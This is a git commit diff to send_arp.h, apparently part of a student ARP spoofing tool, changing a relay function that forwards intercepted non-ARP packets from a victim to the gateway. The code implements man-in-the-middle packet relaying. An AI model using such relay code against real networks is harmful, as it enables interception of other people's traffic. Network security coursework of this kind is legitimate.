6aecca335414c476e0e70364c5f08ec320ac7de4
kkm213 <kkm213@korea.ac.kr>
2022-08-04 19:20:00 +0900

    sent

--- send_arp.h
+++ send_arp.h
@@ -82,12 +82,19 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *victi
             if (if_same_mac(pkt->eth_.dmac_, attacker_mac))
             {
                 printf("%u bytes captured. Actual length: %u\n", header->caplen, header->len); //헤더에서 캡쳐된 패킷 크기 가져와서 출력
-                copy_mac(gate_mac, pkt->eth_.dmac_);
-                int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), header->len);
-                if (res != 0)
+                if (pkt->eth_.type_ == htons(EthHdr::Arp))
                 {
-                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
-                    return -1;
+                }
+                else
+                {
+                    copy_mac(gate_mac, pkt->eth_.dmac_);
+                    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), header->len);
+                    if (res != 0)
+                    {
+                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+                        return -1;
+                    }
+                    printf("sent !\n");
                 }
             }
         }
